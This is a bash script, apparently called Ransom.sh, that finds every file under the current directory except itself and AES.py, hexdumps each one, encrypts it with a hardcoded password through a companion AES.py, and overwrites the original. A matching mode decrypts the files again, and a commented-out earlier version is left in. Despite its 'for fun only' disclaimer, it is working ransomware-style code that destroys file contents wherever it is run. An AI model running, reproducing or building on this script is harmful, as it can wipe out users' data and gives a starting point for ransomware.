#!/bin/bash

# THIS PROGRAM IS INTEDED FOR HAVING FUN ONLY
# DO NOT USE IT ON OTHERS
# ONLY EXECUTE IN A SAFE ENVIRONMENT
# EXECUTION WILL BE ON YOUR OWN REPONSIBILITY

echo -n "Would You Like To Encrypt Or Decrypt (Hexdump) (1/2)>"
read mode

# Past Commented Code Method Using `cat` Didn't Work On Binaries And Other File Types Other Than Text Files

#if [ $mode = '1' ]
#then                     
#    echo "==================================================="
#    echo "===============GATHERING INFORMATION==============="
#    files=`find . -path ./.git -prune -false -o -type f`
#    files=($(echo $files | tr '\b' '\n'))
#    echo $files
#    numOptions=${#files[@]}
#    for (( counter=0; counter<${numOptions}; counter++))
#    do
#        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
#        then
#            unset -v 'files[$counter]'
#            continue
#        fi
#        echo ${files[counter]}
#        data=`cat ${files[counter]}`
#        encData=`./AES.py 'Joe@0192646968' "$data" 1`
#        echo $encData > ${files[counter]}
#    done
#elif [ $mode = '2' ]
#then
#    echo "==================================================="
#    echo "===============GATHERING INFORMATION==============="
#    files=`find . -path ./.git -prune -false -o -type f`
#    files=($(echo $files | tr '\b' '\n'))
#    numOptions=${#files[@]}
#    echo $numOptions
#    for (( counter=0; counter<${numOptions}; counter++))
#    do  
#        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh'
#]
#        then
#            unset -v 'files[$counter]'
#            continue
#        fi
#
#        echo ${files[counter]}
#        data=`cat ${files[counter]}`
#        decData=`./AES.py 'Joe@0192646968' "$data" 2`
#        echo $decData > ${files[counter]}
#    done

# Current Uncommented Code Method Using `xxd` As A Hexdump Creator And Reverter In Order To Successfully Transform The Files With Maximum Precision

if [ $mode = '1' ]
then
    echo "==================================================="
    echo "===============GATHERING INFORMATION==============="
    sleep 1
    files=`find . -path ./.git -prune -false -o -type f`
    files=($(echo $files | tr '\b' '\n'))
    echo $files
    numOptions=${#files[@]}
    for (( counter=0; counter<${numOptions}; counter++))
    do
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
        then
            unset -v 'files[$counter]'
            continue
        fi
        echo ${files[counter]}
        data=`xxd ${files[counter]}`
        encData=`./AES.py 'Joe@0192646968' "$data" 1`
        echo $encData > ${files[counter]}
        sleep 1
    done
    echo "============= Encryption Successful ==============="
    echo "==================================================="
elif [ $mode = '2' ]
then
    echo "==================================================="                   
    echo "===============GATHERING INFORMATION==============="
    sleep 1
    files=`find . -path ./.git -prune -false -o -type f`                         
    files=($(echo $files | tr '\b' '\n'))                                        
    numOptions=${#files[@]}                                                             
    for (( counter=0; counter<${numOptions}; counter++))                         
    do                                                                           
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]                                                                                
        then                                                                     
            unset -v 'files[$counter]'     
            continue
        fi
        echo ${files[counter]}                                                   
        data=`cat ${files[counter]}`   
        decData=`./AES.py 'Joe@0192646968' "$data" 2 > TEST`
        data=`xxd -r TEST > ${files[counter]}`
        echo -e `rm TEST`
        sleep 1
    done
    echo "============= Decryption Successful ==============="
    echo "==================================================="

fi

# =========================== By Avalancher ===============================

